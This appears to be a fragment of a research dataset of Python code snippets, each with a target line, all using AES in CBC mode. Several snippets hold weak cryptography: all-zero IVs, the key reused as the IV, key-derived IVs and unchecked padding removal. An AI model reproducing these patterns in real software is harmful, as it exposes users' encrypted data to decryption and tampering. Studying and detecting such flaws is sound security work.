      "    dec = cipher.decrypt(data)\n",
      "    return tools.stripPadding(dec)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CBC crypto with PKCS#7 padding                  ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    data = tools.addPadding(data)\n",
      "    blocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in blocks:\n",
      "      inBlock = xor(block, iv)\n",
      "      encBlock = cipher.encrypt(inBlock)\n",
      "      iv = encBlock\n",
      "      result += encBlock\n",
      "    \n",
      "    return result\n",
      "    \n",
      "def decryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    encBlocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in encBlocks:\n",
      "      decBlock = cipher.decrypt(block)\n",
      "      dec = xor(decBlock, iv)\n",
      "      iv = block\n",
      "      result += dec\n",
      "    return tools.stripPadding(result)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CTR crypto                                      ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCTR(key, nonce, data, littleEndian=False):\n",
      "    '''\n",
      "       Perform CTR encrpytion\n",
      "       Cipher input is 128bit key, 64bit nonce.\n",
      "       Counter is generated big endian (usual) or little endian.\n",
      "    '''\n",
      "    inBlocks = tools.split(data, 16)\n",
      "\n",
      "    iv = bytearray(nonce + (b'\\000' * 8))\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for inBlock in inBlocks:\n",
      "      encBlock = cipher.encrypt(bytes(iv))\n",
      "      enc = xor(inBlock, encBlock)\n",
      "      _nextBlock(iv, littleEndian)\n",
      "      result += enc\n",
      "    return result\n",
      "\n",
      "\n",
      "def _nextBlock(iv, littleEndian):\n",
      "    if littleEndian:\n",
      "      start = 8\n",
      "      d = 1\n",
      "      end = 16\n",
      "    else:\n",
      "      start = 15\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/toolbox/crypto.py",
    "code": [
      "def encryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    data = tools.addPadding(data)\n",
      "    blocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in blocks:\n",
      "      inBlock = xor(block, iv)\n",
      "      encBlock = cipher.encrypt(inBlock)\n",
      "      iv = encBlock\n",
      "      result += encBlock\n",
      "    \n",
      "    return result\n",
      "    \n",
      "def decryptCBC(key, data, iv = b'\\000' * 16):\n",
      "    encBlocks = tools.split(data, 16, False)\n",
      "\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for block in encBlocks:\n",
      "      decBlock = cipher.decrypt(block)\n",
      "      dec = xor(decBlock, iv)\n",
      "      iv = block\n",
      "      result += dec\n",
      "    return tools.stripPadding(result)\n",
      "\n",
      "#########################################################################\n",
      "###               AES CTR crypto                                      ###\n",
      "#########################################################################\n",
      "\n",
      "def encryptCTR(key, nonce, data, littleEndian=False):\n",
      "    '''\n",
      "       Perform CTR encrpytion\n",
      "       Cipher input is 128bit key, 64bit nonce.\n",
      "       Counter is generated big endian (usual) or little endian.\n",
      "    '''\n",
      "    inBlocks = tools.split(data, 16)\n",
      "\n",
      "    iv = bytearray(nonce + (b'\\000' * 8))\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(key, AES.MODE_ECB)\n",
      "    \n",
      "    for inBlock in inBlocks:\n",
      "      encBlock = cipher.encrypt(bytes(iv))\n",
      "      enc = xor(inBlock, encBlock)\n",
      "      _nextBlock(iv, littleEndian)\n",
      "      result += enc\n",
      "    return result\n",
      "\n",
      "\n",
      "def _nextBlock(iv, littleEndian):\n",
      "    if littleEndian:\n",
      "      start = 8\n",
      "      d = 1\n",
      "      end = 16\n",
      "    else:\n",
      "      start = 15\n",
      "      d = -1\n",
      "      end = 7\n",
      "    carry = 1\n",
      "    for idx in range(start,end,d):\n",
      "      n = iv[idx] + carry\n",
      "      iv[idx] = n & 0xFF\n",
      "      carry = n>>8\n",
      "      if not carry:\n",
      "        break\n",
      "\n",
      "    return iv\n",
      "#########################################################################\n",
      "###               Tests                                               ###\n",
      "#########################################################################\n",
      "\n",
      "\n",
      "if  __name__ == '__main__':\n",
      "  print(\"No Tests\")\n",
      "\n"
    ],
    "target": 45,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/anomen-s/programming-challenges/cryptopals.com/0010-Implement_CBC_mode/solve.py",
    "code": [
      "#!/usr/bin/python3\n",
      "# -*- coding: utf-8 -*-\n",
      "'''\n",
      "CBC mode is a block cipher mode that allows us to encrypt irregularly-sized messages, despite the fact that a block cipher natively only transforms individual blocks. \n",
      "\n",
      "In CBC mode, each ciphertext block is added to the next plaintext block before the next call to the cipher core. \n",
      "\n",
      "The first plaintext block, which has no associated previous ciphertext block, is added to a \"fake 0th ciphertext block\" called the initialization vector, or IV. \n",
      "\n",
      "Implement CBC mode by hand by taking the ECB function you wrote earlier, making it encrypt instead of decrypt (verify this by decrypting whatever you encrypt to test), and using your XOR function from the previous exercise to combine them. \n",
      "\n",
      "The file here is intelligible (somewhat) when CBC decrypted against \"YELLOW SUBMARINE\" with an IV of all ASCII 0 (\\x00\\x00\\x00 &c)\n",
      " \n",
      "'''\n",
      "\n",
      "import sys\n",
      "\n",
      "sys.path.append(\"../toolbox\")\n",
      "import tools\n",
      "import crypto\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "\n",
      "KEY=b\"YELLOW SUBMARINE\"\n",
      "IV=b'\\000' * 16\n",
      "\n",
      "F='10.txt'\n",
      "\n",
      "def main():\n",
      "    with open(F,'r') as f:\n",
      "      b64 = f.read()\n",
      "      enc = tools.fromB64(b64)\n",
      "    \n",
      "    encBlocks = tools.split(enc, 16, False)\n",
      "\n",
      "    iv = IV\n",
      "    result = b''\n",
      "    \n",
      "    cipher=AES.new(KEY, AES.MODE_ECB)\n",
      "    \n",
      "    for block in encBlocks:\n",
      "      decBlock = cipher.decrypt(block)\n",
      "      dec = crypto.xor(decBlock, iv)\n",
      "      iv = block\n",
      "      result += dec\n",
      "    \n",
      "    print(tools.toStr(tools.stripPadding(result)))\n",
      "\n",
      "if __name__ =='__main__':\n",
      "  tools.run(main)\n",
      "\n"
    ],
    "target": 38,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/ge0rgi/cinder/cinder/volume/drivers/synology/synology_common.py",
    "code": [
      "               secret=True),\n",
      "    cfg.StrOpt('synology_device_id',\n",
      "               default=None,\n",
      "               help='Device id for skip one time password check for '\n",
      "                    'logging in Synology storage if OTP is enabled.'),\n",
      "]\n",
      "\n",
      "LOG = logging.getLogger(__name__)\n",
      "\n",
      "CONF = cfg.CONF\n",
      "CONF.register_opts(cinder_opts)\n",
      "\n",
      "\n",
      "class AESCipher(object):\n",
      "    \"\"\"Encrypt with OpenSSL-compatible way\"\"\"\n",
      "\n",
      "    SALT_MAGIC = 'Salted__'\n",
      "\n",
      "    def __init__(self, password, key_length=32):\n",
      "        self._bs = AES.block_size\n",
      "        self._salt = Random.new().read(self._bs - len(self.SALT_MAGIC))\n",
      "\n",
      "        self._key, self._iv = self._derive_key_and_iv(password,\n",
      "                                                      self._salt,\n",
      "                                                      key_length,\n",
      "                                                      self._bs)\n",
      "\n",
      "    def _pad(self, s):\n",
      "        bs = self._bs\n",
      "        return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)\n",
      "\n",
      "    def _derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "        d = d_i = ''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            md5_str = d_i + password + salt\n",
      "            d_i = hashlib.md5(md5_str).digest()\n",
      "            d += d_i\n",
      "        return d[:key_length], d[key_length:key_length + iv_length]\n",
      "\n",
      "    def encrypt(self, text):\n",
      "        cipher = AES.new(self._key, AES.MODE_CBC, self._iv)\n",
      "        ciphertext = cipher.encrypt(self._pad(text))\n",
      "\n",
      "        return \"%s%s%s\" % (self.SALT_MAGIC, self._salt, ciphertext)\n",
      "\n",
      "\n",
      "class Session(object):\n",
      "    def __init__(self,\n",
      "                 host,\n",
      "                 port,\n",
      "                 username,\n",
      "                 password,\n",
      "                 https=False,\n",
      "                 ssl_verify=True,\n",
      "                 one_time_pass=None,\n",
      "                 device_id=None):\n",
      "        self._proto = 'https' if https else 'http'\n",
      "        self._host = host\n",
      "        self._port = port\n",
      "        self._sess = 'dsm'\n",
      "        self._https = https\n",
      "        self._url_prefix = self._proto + '://' + host + ':' + str(port)\n",
      "        self._url = self._url_prefix + '/webapi/auth.cgi'\n",
      "        self._ssl_verify = ssl_verify\n",
      "        self._sid = None\n",
      "        self._did = device_id\n",
      "\n",
      "        data = {'api': 'SYNO.API.Auth',\n",
      "                'method': 'login',\n",
      "                'version': 6}\n",
      "\n",
      "        params = {'account': username,\n",
      "                  'passwd': password,\n",
      "                  'session': self._sess,\n",
      "                  'format': 'sid'}\n",
      "\n",
      "        if one_time_pass:\n",
      "            if device_id:\n",
      "                params.update(device_id=device_id)\n",
      "            else:\n",
      "                params.update(otp_code=one_time_pass,\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/strekmann/nidarholmjs/scripts/nidarholm_lists.py",
    "code": [
      "# -*- encoding: utf-8 -*-\n",
      "\n",
      "import os\n",
      "import json\n",
      "import base64\n",
      "import subprocess\n",
      "from Crypto.Cipher import AES\n",
      "from urllib2 import urlopen\n",
      "\n",
      "\n",
      "BLOCK_SIZE = 16\n",
      "\n",
      "\n",
      "def pad(data):\n",
      "    pad = BLOCK_SIZE - len(data) % BLOCK_SIZE\n",
      "    return data + pad * chr(pad)\n",
      "\n",
      "\n",
      "def unpad(padded):\n",
      "    pad = ord(padded[-1])\n",
      "    return padded[:-pad]\n",
      "\n",
      "\n",
      "def encrypt(data, password):\n",
      "    data = pad(data)\n",
      "    aes = AES.new(password, AES.MODE_CBC, password[:16])\n",
      "    encrypted = aes.encrypt(data)\n",
      "    return base64.urlsafe_b64encode(encrypted)\n",
      "\n",
      "\n",
      "def decrypt(edata, password):\n",
      "    edata = base64.urlsafe_b64decode(edata)\n",
      "    aes = AES.new(password, AES.MODE_CBC, password[:16])\n",
      "    return unpad(aes.decrypt(edata))\n",
      "\n",
      "\n",
      "def request(groups):\n",
      "    dir = os.path.dirname(os.path.abspath(__file__))\n",
      "    with open(dir + '/settings.json') as settings_file:\n",
      "        settings = json.load(settings_file)\n",
      "        password = settings['password']\n",
      "        server_address = settings['server_address']\n",
      "\n",
      "    data = {'prefix': \"nidarholm-\", 'groups': groups}\n",
      "    data = json.dumps(data)\n",
      "    encoded = encrypt(data, password)\n",
      "    url = (server_address + \"/organization/updated_email_lists.json/\" +\n",
      "           encoded)\n",
      "\n",
      "    contents = urlopen(url).read()\n",
      "\n",
      "    decoded = decrypt(contents, password)\n",
      "    data = json.loads(decoded)\n",
      "\n",
      "    for listname, group in data.items():\n",
      "        new_list = file(\"/tmp/\" + listname, \"w\")\n",
      "        for email in group:\n",
      "            new_list.write(email + \"\\n\")\n",
      "        new_list.close()\n",
      "\n",
      "        # next level\n",
      "        command = '/usr/sbin/sync_members -f /tmp/' + listname + ' ' + listname\n",
      "        print command\n",
      "        process = subprocess.Popen(command.split(), shell=False,\n",
      "                                   stdout=subprocess.PIPE)\n",
      "        output = process.communicate()[0]\n",
      "        if output:\n",
      "            print \"===================================\"\n",
      "            print group\n",
      "            print output\n",
      "\n",
      "\n",
      "def main():\n",
      "    request([\"Medlemmer\", \"Styret\", \"Plankom\", \"Jubileum\"])\n",
      "    request([\"Fløyte\", \"Obo\", \"Fagott\", \"Klarinett\", \"Saksofon\", \"Horn\",\n",
      "             \"Småmessing\", \"Trombone\", \"Euph\", \"Tuba\", \"Slagverk\"])\n",
      "\n",
      "\n",
      "if __name__ == \"__main__\":\n",
      "    main()\n"
    ],
    "target": 25,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/strekmann/nidarholmjs/scripts/nidarholm_lists.py",
    "code": [
      "# -*- encoding: utf-8 -*-\n",
      "\n",
      "import os\n",
      "import json\n",
      "import base64\n",
      "import subprocess\n",
      "from Crypto.Cipher import AES\n",
      "from urllib2 import urlopen\n",
      "\n",
      "\n",
      "BLOCK_SIZE = 16\n",
      "\n",
      "\n",
      "def pad(data):\n",
      "    pad = BLOCK_SIZE - len(data) % BLOCK_SIZE\n",
      "    return data + pad * chr(pad)\n",
      "\n",
      "\n",
      "def unpad(padded):\n",
      "    pad = ord(padded[-1])\n",
      "    return padded[:-pad]\n",
      "\n",
      "\n",
      "def encrypt(data, password):\n",
      "    data = pad(data)\n",
      "    aes = AES.new(password, AES.MODE_CBC, password[:16])\n",
      "    encrypted = aes.encrypt(data)\n",
      "    return base64.urlsafe_b64encode(encrypted)\n",
      "\n",
      "\n",
      "def decrypt(edata, password):\n",
      "    edata = base64.urlsafe_b64decode(edata)\n",
      "    aes = AES.new(password, AES.MODE_CBC, password[:16])\n",
      "    return unpad(aes.decrypt(edata))\n",
      "\n",
      "\n",
      "def request(groups):\n",
      "    dir = os.path.dirname(os.path.abspath(__file__))\n",
      "    with open(dir + '/settings.json') as settings_file:\n",
      "        settings = json.load(settings_file)\n",
      "        password = settings['password']\n",
      "        server_address = settings['server_address']\n",
      "\n",
      "    data = {'prefix': \"nidarholm-\", 'groups': groups}\n",
      "    data = json.dumps(data)\n",
      "    encoded = encrypt(data, password)\n",
      "    url = (server_address + \"/organization/updated_email_lists.json/\" +\n",
      "           encoded)\n",
      "\n",
      "    contents = urlopen(url).read()\n",
      "\n",
      "    decoded = decrypt(contents, password)\n",
      "    data = json.loads(decoded)\n",
      "\n",
      "    for listname, group in data.items():\n",
      "        new_list = file(\"/tmp/\" + listname, \"w\")\n",
      "        for email in group:\n",
      "            new_list.write(email + \"\\n\")\n",
      "        new_list.close()\n",
      "\n",
      "        # next level\n",
      "        command = '/usr/sbin/sync_members -f /tmp/' + listname + ' ' + listname\n",
      "        print command\n",
      "        process = subprocess.Popen(command.split(), shell=False,\n",
      "                                   stdout=subprocess.PIPE)\n",
      "        output = process.communicate()[0]\n",
      "        if output:\n",
      "            print \"===================================\"\n",
      "            print group\n",
      "            print output\n",
      "\n",
      "\n",
      "def main():\n",
      "    request([\"Medlemmer\", \"Styret\", \"Plankom\", \"Jubileum\"])\n",
      "    request([\"Fløyte\", \"Obo\", \"Fagott\", \"Klarinett\", \"Saksofon\", \"Horn\",\n",
      "             \"Småmessing\", \"Trombone\", \"Euph\", \"Tuba\", \"Slagverk\"])\n",
      "\n",
      "\n",
      "if __name__ == \"__main__\":\n",
      "    main()\n"
    ],
    "target": 32,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/xinjiguaike/edx-platform/lms/djangoapps/verify_student/ssencrypt.py",
    "code": [
      "from Crypto.Cipher import AES, PKCS1_OAEP\n",
      "from Crypto.PublicKey import RSA\n",
      "\n",
      "log = logging.getLogger(__name__)\n",
      "\n",
      "\n",
      "def encrypt_and_encode(data, key):\n",
      "    \"\"\" Encrypts and endcodes `data` using `key' \"\"\"\n",
      "    return base64.urlsafe_b64encode(aes_encrypt(data, key))\n",
      "\n",
      "\n",
      "def decode_and_decrypt(encoded_data, key):\n",
      "    \"\"\" Decrypts and decodes `data` using `key' \"\"\"\n",
      "    return aes_decrypt(base64.urlsafe_b64decode(encoded_data), key)\n",
      "\n",
      "\n",
      "def aes_encrypt(data, key):\n",
      "    \"\"\"\n",
      "    Return a version of the `data` that has been encrypted to\n",
      "    \"\"\"\n",
      "    cipher = aes_cipher_from_key(key)\n",
      "    padded_data = pad(data)\n",
      "    return cipher.encrypt(padded_data)\n",
      "\n",
      "\n",
      "def aes_decrypt(encrypted_data, key):\n",
      "    \"\"\"\n",
      "    Decrypt `encrypted_data` using `key`\n",
      "    \"\"\"\n",
      "    cipher = aes_cipher_from_key(key)\n",
      "    padded_data = cipher.decrypt(encrypted_data)\n",
      "    return unpad(padded_data)\n",
      "\n",
      "\n",
      "def aes_cipher_from_key(key):\n",
      "    \"\"\"\n",
      "    Given an AES key, return a Cipher object that has `encrypt()` and\n",
      "    `decrypt()` methods. It will create the cipher to use CBC mode, and create\n",
      "    the initialization vector as Software Secure expects it.\n",
      "    \"\"\"\n",
      "    return AES.new(key, AES.MODE_CBC, generate_aes_iv(key))\n",
      "\n",
      "\n",
      "def generate_aes_iv(key):\n",
      "    \"\"\"\n",
      "    Return the initialization vector Software Secure expects for a given AES\n",
      "    key (they hash it a couple of times and take a substring).\n",
      "    \"\"\"\n",
      "    return md5(key + md5(key).hexdigest()).hexdigest()[:AES.block_size]\n",
      "\n",
      "\n",
      "def random_aes_key():\n",
      "    return Random.new().read(32)\n",
      "\n",
      "\n",
      "def pad(data):\n",
      "    \"\"\" Pad the given `data` such that it fits into the proper AES block size \"\"\"\n",
      "    bytes_to_pad = AES.block_size - len(data) % AES.block_size\n",
      "    return data + (bytes_to_pad * chr(bytes_to_pad))\n",
      "\n",
      "\n",
      "def unpad(padded_data):\n",
      "    \"\"\"  remove all padding from `padded_data` \"\"\"\n",
      "    num_padded_bytes = ord(padded_data[-1])\n",
      "    return padded_data[:-num_padded_bytes]\n",
      "\n",
      "\n",
      "def rsa_encrypt(data, rsa_pub_key_str):\n",
      "    \"\"\"\n",
      "    `rsa_pub_key` is a string with the public key\n",
      "    \"\"\"\n",
      "    key = RSA.importKey(rsa_pub_key_str)\n",
      "    cipher = PKCS1_OAEP.new(key)\n",
      "    encrypted_data = cipher.encrypt(data)\n",
      "    return encrypted_data\n",
      "\n",
      "\n",
      "def rsa_decrypt(data, rsa_priv_key_str):\n",
      "    \"\"\"\n",
      "    When given some `data` and an RSA private key, decrypt the data\n",
      "    \"\"\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/xinjiguaike/edx-platform/lms/djangoapps/notification_prefs/views.py",
    "code": [
      "from django.conf import settings\n",
      "from django.contrib.auth.models import User\n",
      "from django.core.exceptions import PermissionDenied\n",
      "from django.http import Http404, HttpResponse\n",
      "from django.views.decorators.http import require_GET, require_POST\n",
      "\n",
      "from edxmako.shortcuts import render_to_response\n",
      "from notification_prefs import NOTIFICATION_PREF_KEY\n",
      "from openedx.core.djangoapps.user_api.models import UserPreference\n",
      "from openedx.core.djangoapps.user_api.preferences.api import delete_user_preference\n",
      "\n",
      "\n",
      "class UsernameDecryptionException(Exception):\n",
      "    pass\n",
      "\n",
      "\n",
      "class UsernameCipher(object):\n",
      "    \"\"\"\n",
      "    A transformation of a username to/from an opaque token\n",
      "\n",
      "    The purpose of the token is to make one-click unsubscribe links that don't\n",
      "    require the user to log in. To prevent users from unsubscribing other users,\n",
      "    we must ensure the token cannot be computed by anyone who has this\n",
      "    source code. The token must also be embeddable in a URL.\n",
      "\n",
      "    Thus, we take the following steps to encode (and do the inverse to decode):\n",
      "    1. Pad the UTF-8 encoding of the username with PKCS#7 padding to match the\n",
      "       AES block length\n",
      "    2. Generate a random AES block length initialization vector\n",
      "    3. Use AES-256 (with a hash of settings.SECRET_KEY as the encryption key)\n",
      "       in CBC mode to encrypt the username\n",
      "    4. Prepend the IV to the encrypted value to allow for initialization of the\n",
      "       decryption cipher\n",
      "    5. base64url encode the result\n",
      "    \"\"\"\n",
      "\n",
      "    @staticmethod\n",
      "    def _get_aes_cipher(initialization_vector):\n",
      "        hash_ = sha256()\n",
      "        hash_.update(settings.SECRET_KEY)\n",
      "        return AES.new(hash_.digest(), AES.MODE_CBC, initialization_vector)\n",
      "\n",
      "    @staticmethod\n",
      "    def _add_padding(input_str):\n",
      "        \"\"\"Return `input_str` with PKCS#7 padding added to match AES block length\"\"\"\n",
      "        padding_len = AES.block_size - len(input_str) % AES.block_size\n",
      "        return input_str + padding_len * chr(padding_len)\n",
      "\n",
      "    @staticmethod\n",
      "    def _remove_padding(input_str):\n",
      "        \"\"\"Return `input_str` with PKCS#7 padding trimmed to match AES block length\"\"\"\n",
      "        num_pad_bytes = ord(input_str[-1])\n",
      "        if num_pad_bytes < 1 or num_pad_bytes > AES.block_size or num_pad_bytes >= len(input_str):\n",
      "            raise UsernameDecryptionException(\"padding\")\n",
      "        return input_str[:-num_pad_bytes]\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(username):\n",
      "        initialization_vector = Random.new().read(AES.block_size)\n",
      "        aes_cipher = UsernameCipher._get_aes_cipher(initialization_vector)\n",
      "        return urlsafe_b64encode(\n",
      "            initialization_vector +\n",
      "            aes_cipher.encrypt(UsernameCipher._add_padding(username.encode(\"utf-8\")))\n",
      "        )\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(token):\n",
      "        try:\n",
      "            base64_decoded = urlsafe_b64decode(token)\n",
      "        except TypeError:\n",
      "            raise UsernameDecryptionException(\"base64url\")\n",
      "\n",
      "        if len(base64_decoded) < AES.block_size:\n",
      "            raise UsernameDecryptionException(\"initialization_vector\")\n",
      "\n",
      "        initialization_vector = base64_decoded[:AES.block_size]\n",
      "        aes_encrypted = base64_decoded[AES.block_size:]\n",
      "        aes_cipher = UsernameCipher._get_aes_cipher(initialization_vector)\n",
      "\n",
      "        try:\n",
      "            decrypted = aes_cipher.decrypt(aes_encrypted)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/skylifewww/pangolin-fog/recaptcha-client-1.0.6/recaptcha/client/mailhide.py",
    "code": [
      "import base64\n",
      "import cgi\n",
      "\n",
      "try:\n",
      "    from Crypto.Cipher import AES\n",
      "except:\n",
      "    raise Exception (\"You need the pycrpyto library: http://cheeseshop.python.org/pypi/pycrypto/\")\n",
      "\n",
      "MAIL_HIDE_BASE=\"http://www.google.com/recaptcha/mailhide\"\n",
      "\n",
      "def asurl (email,\n",
      "                 public_key,\n",
      "                 private_key):\n",
      "    \"\"\"Wraps an email address with reCAPTCHA mailhide and\n",
      "    returns the url. public_key is the public key from reCAPTCHA\n",
      "    (in the base 64 encoded format). Private key is the AES key, and should\n",
      "    be 32 hex chars.\"\"\"\n",
      "    \n",
      "    cryptmail = _encrypt_string (email, base64.b16decode (private_key, casefold=True), '\\0' * 16)\n",
      "    base64crypt = base64.urlsafe_b64encode (cryptmail)\n",
      "\n",
      "    return \"%s/d?k=%s&c=%s\" % (MAIL_HIDE_BASE, public_key, base64crypt)\n",
      "\n",
      "def ashtml (email,\n",
      "                  public_key,\n",
      "                  private_key):\n",
      "    \"\"\"Wraps an email address with reCAPTCHA Mailhide and\n",
      "    returns html that displays the email\"\"\"\n",
      "\n",
      "    url = asurl (email, public_key, private_key)\n",
      "    (userpart, domainpart) = _doterizeemail (email)\n",
      "\n",
      "    return \"\"\"%(user)s<a href='%(url)s' onclick=\"window.open('%(url)s', '', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=500,height=300'); return false;\" title=\"Reveal this e-mail address\">...</a>@%(domain)s\"\"\" % {\n",
      "        'user' : cgi.escape (userpart),\n",
      "        'domain' : cgi.escape (domainpart),\n",
      "        'url'  : cgi.escape (url),\n",
      "        }\n",
      "    \n",
      "\n",
      "def _pad_string (str, block_size):\n",
      "    numpad = block_size - (len (str) % block_size)\n",
      "    return str + numpad * chr (numpad)\n",
      "\n",
      "def _encrypt_string (str, aes_key, aes_iv):\n",
      "    if len (aes_key) != 16:\n",
      "        raise Exception (\"expecting key of length 16\")\n",
      "    if len (aes_iv) != 16:\n",
      "        raise Exception (\"expecting iv of length 16\")\n",
      "    return AES.new (aes_key, AES.MODE_CBC, aes_iv).encrypt (_pad_string (str, 16))\n",
      "\n",
      "def _doterizeemail (email):\n",
      "    \"\"\"replaces part of the username with dots\"\"\"\n",
      "    \n",
      "    try:\n",
      "        [user, domain] = email.split ('@')\n",
      "    except:\n",
      "        # handle invalid emails... sorta\n",
      "        user = email\n",
      "        domain = \"\"\n",
      "\n",
      "    if len(user) <= 4:\n",
      "        user_prefix = user[:1]\n",
      "    elif len(user) <= 6:\n",
      "        user_prefix = user[:3]\n",
      "    else:\n",
      "        user_prefix = user[:4]\n",
      "\n",
      "    return (user_prefix, domain)\n"
    ],
    "target": 48,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/danieldanciu/schoggi/common/crypto.py",
    "code": [
      "            entity = config.ConfigPropertyEntity.get_by_key_name(cfg.name)\n",
      "            if not entity:\n",
      "                entity = config.ConfigPropertyEntity(key_name=cfg.name)\n",
      "\n",
      "            # Any non-default non-None value is fine.\n",
      "            if (entity.value and not entity.is_draft and\n",
      "                (str(entity.value) != str(cfg.default_value))):\n",
      "                return\n",
      "\n",
      "            # Initialize to random value.\n",
      "            entity.value = base64.urlsafe_b64encode(\n",
      "                os.urandom(int(length * 0.75)))\n",
      "            entity.is_draft = False\n",
      "            entity.put()\n",
      "\n",
      "    @classmethod\n",
      "    def _get_hmac_secret(cls):\n",
      "        \"\"\"Verifies that non-default XSRF secret exists; creates one if not.\"\"\"\n",
      "        cls._init_secret_if_none(XSRF_SECRET, XSRF_SECRET_LENGTH)\n",
      "        return XSRF_SECRET.value\n",
      "\n",
      "    @classmethod\n",
      "    def _get_encryption_secret(cls):\n",
      "        \"\"\"Verifies non-default encryption secret exists; creates one if not.\"\"\"\n",
      "        cls._init_secret_if_none(ENCRYPTION_SECRET, ENCRYPTION_SECRET_LENGTH)\n",
      "        return ENCRYPTION_SECRET.value\n",
      "\n",
      "    @classmethod\n",
      "    def hmac(cls, components):\n",
      "        \"\"\"Generate an XSRF over the array of components strings.\"\"\"\n",
      "        secret = cls._get_hmac_secret()\n",
      "        digester = hmac.new(str(secret))\n",
      "        for component in components:\n",
      "            digester.update(component)\n",
      "        return digester.digest()\n",
      "\n",
      "    @classmethod\n",
      "    def _build_crypto(cls, secret):\n",
      "        if len(secret) != 48:\n",
      "            raise ValueError('Encryption secret must be exactly 48 characters')\n",
      "        return AES.new(secret[:32], AES.MODE_CBC, secret[32:])\n",
      "\n",
      "    @classmethod\n",
      "    def encrypt(cls, message, secret=None):\n",
      "        \"\"\"Encrypt a message.  Message value returned is not URL-safe.\"\"\"\n",
      "        message = message or ''\n",
      "        message = '%d.%s' % (len(message), message)\n",
      "        message += '^' * (16 - len(message) % 16)\n",
      "        secret = secret or cls._get_encryption_secret()\n",
      "        return cls._build_crypto(secret).encrypt(message)\n",
      "\n",
      "    @classmethod\n",
      "    def encrypt_to_urlsafe_ciphertext(cls, message, secret=None):\n",
      "        \"\"\"Convenience wrapper to get URL-safe version of encrytped data.\"\"\"\n",
      "        return base64.urlsafe_b64encode(cls.encrypt(message, secret))\n",
      "\n",
      "    @classmethod\n",
      "    def decrypt(cls, message, secret=None):\n",
      "        \"\"\"Decrypt a message, returning the original plaintext.\"\"\"\n",
      "        secret = secret or cls._get_encryption_secret()\n",
      "        crypto = cls._build_crypto(secret)\n",
      "        message = crypto.decrypt(message)\n",
      "        delim_index = message.find('.')\n",
      "        original_length = int(message[:delim_index])\n",
      "        return message[delim_index + 1:delim_index + 1 + original_length]\n",
      "\n",
      "    @classmethod\n",
      "    def decrypt_from_urlsafe_ciphertext(cls, message, secret=None):\n",
      "        return cls.decrypt(base64.urlsafe_b64decode(message), secret)\n",
      "\n",
      "\n",
      "class XsrfTokenManager(object):\n",
      "    \"\"\"Provides XSRF protection by managing action/user tokens in memcache.\"\"\"\n",
      "\n",
      "    # Max age of the token (4 hours).\n",
      "    XSRF_TOKEN_AGE_SECS = 60 * 60 * 4\n",
      "\n",
      "    # Token delimiters.\n",
      "    DELIMITER_PRIVATE = ':'\n",
      "    DELIMITER_PUBLIC = '/'\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/talishte/ctigre/env/lib/python2.7/site-packages/paramiko/pkey.py",
    "code": [
      "#\n",
      "# This file is part of paramiko.\n",
      "#\n",
      "# Paramiko is free software; you can redistribute it and/or modify it under the\n",
      "# terms of the GNU Lesser General Public License as published by the Free\n",
      "# Software Foundation; either version 2.1 of the License, or (at your option)\n",
      "# any later version.\n",
      "#\n",
      "# Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY\n",
      "# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR\n",
      "# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more\n",
      "# details.\n",
      "#\n",
      "# You should have received a copy of the GNU Lesser General Public License\n",
      "# along with Paramiko; if not, write to the Free Software Foundation, Inc.,\n",
      "# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.\n",
      "\n",
      "\"\"\"\n",
      "Common API for all public keys.\n",
      "\"\"\"\n",
      "\n",
      "import base64\n",
      "from binascii import hexlify, unhexlify\n",
      "import os\n",
      "from hashlib import md5\n",
      "\n",
      "from Crypto.Cipher import DES3, AES\n",
      "\n",
      "from paramiko import util\n",
      "from paramiko.common import o600, zero_byte\n",
      "from paramiko.py3compat import u, encodebytes, decodebytes, b\n",
      "from paramiko.ssh_exception import SSHException, PasswordRequiredException\n",
      "\n",
      "\n",
      "class PKey (object):\n",
